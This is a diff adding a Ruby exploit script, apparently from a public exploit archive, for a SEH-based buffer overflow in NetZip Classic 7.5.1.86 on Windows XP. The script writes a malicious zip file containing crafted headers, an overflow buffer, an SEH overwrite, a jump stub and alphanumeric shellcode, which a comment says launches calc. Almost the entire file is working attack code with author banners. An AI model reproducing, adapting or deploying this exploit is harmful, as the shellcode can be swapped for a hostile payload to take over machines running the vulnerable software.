@@ -1,0 +1,118 @@
+#
+#
+#[+]Exploit Title: Exploit Buffer Overflow NetZip Classic(SEH)
+#[+]Date: 01\30\\2011
+#[+]Author: C4SS!0 G0M3S
+#[+]Software Link: http://proforma.real.com/real/nzclassic/nzclassic.html
+#[+]Version: 7.5.1.86
+#[+]Tested on: WIN-XP SP3 PORTUGUESE BRAZILIAN
+#[+]CVE: N/A
+#
+#The structure of the zip file has been copied from the exploit CORELAN TEAM.
+#Thanks For all Turuial Corelan Team
+#
+#Created BY C4SS!0 G0M3S
+#WWW.INVASAO.COM.BR
+#Louredo_@hotmail.com
+#
+#
+
+def usage()
+system("cls")
+system("color 4f");
+str = 
+"""
+
+
+              #######   #   ###### ######   #  #############
+              #        ##   #      #        #  #           #  
+              #      #  #   #      #        #  #           #   
+              #      ###### ###### ######   #  #           #   
+              #         #        #      #   #  #           #  
+              #         #        #      #   #  #           #    
+              #######   #   ###### ######   0  #############
+			  
+              
+	      [+]Exploit Buffer Overlfow NetZip Classic 7.5.1.86
+			  
+	      [+]Author C4SS!0 G0M3S
+			  
+	      [+]E-mail Louredo_@hotmail.com
+			  
+			  
+"""
+print str
+end
+if ARGV.length !=1
+     usage()
+	 print "[-]Usage: "+$0+" <File Name>\n"
+	 print "[-]Exemple: "+$0+" Exploit.zip\n"
+	 exit
+end
+usage()
+filename = ARGV[0]
+head1 = 
+"\x50\x4B\x03\x04\x14\x00\x00"+
+"\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" +
+"\x00\x00\x00\x00\x00\x00\x00\x00" +
+"\xe4\x0f" +
+"\x00\x00\x00";
+
+head2 = 
+"\x50\x4B\x01\x02\x14\x00\x14"+
+"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" +
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
+"\xe4\x0f"+ 
+"\x00\x00\x00\x00\x00\x00\x01\x00"+
+"\x24\x00\x00\x00\x00\x00\x00\x00";
+
+end1 = 
+"\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"+
+"\x12\x10\x00\x00"+
+"\x02\x10\x00\x00"+ 
+"\x00\x00";
+
+buffer = "\x41" * 235
+nseh = "\x59\x40\x40\x40"
+seh = [0x10057A41].pack('V')#
+egg = "\x41" * 5 #4 INC ECX
+egg += "\x61" * 6 #6 POPAD
+egg += "\x04\x10" #ADD AL,10
+egg += "\x98\xd1" #CALL EAX 
+egg += "\x41" * 5 #JUNK TO SHELLCODE
+puts "              [*]Identifying the length Shellcode\n\n"
+sleep(1)
+shellcode = 
+"PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIYKIPVQXIOO3L5FBPXLN9D"+
+"46DJTNQ5N0XVQD84XK3M8KL33RXE8L4MUP02XOLSUO92XOFVCKEL3X4NNSM5RNJGJP2ELOOSRJM5M64X"+ #Shellcode WinExec("calc",0) 
+"USVQ9WQKWLVSPJUT1XJDFWEZUB4O7SLKKUKUURKZP179M1XKMWRP8EKI2M8YSZW7KCJ8OPL0O7SHSPSY"+ #ALPHA BASEADDRESS EAX
+"41GL7XXWKLCLNK35O0WQCSTPQY1VSXML5O6L5IQCNMHJUNJL1UUOX7VMIWMWK9PXYKN0QE1OFTNVOMUT"+
+"YK7OGT8FOPYLP3K8W5UCOM83KYZA"
+
+puts "              [*]The length is Shellcode: #{shellcode.length}\n\n"
+sleep(1)
+
+
+junk = "\x41" * (4064 - (buffer+nseh+seh+egg+shellcode).length)
+
+payload = buffer+nseh+seh+egg+shellcode+junk
+
+payload += ".txt"
+
+exploit_zip = head1+payload+head2+payload+end1
+puts "              [*]Creating the File #{filename}\n\n"
+sleep(1)
+begin
+
+f = File.open(filename,"w")
+f.puts exploit_zip
+f.close
+puts "              [*]The File #{filename} was Created with Success\n\n"
+sleep(1)
+rescue
+
+puts "              [*]Error When Creating The File #{filename}\n\n"
+exit   
+
+end
+
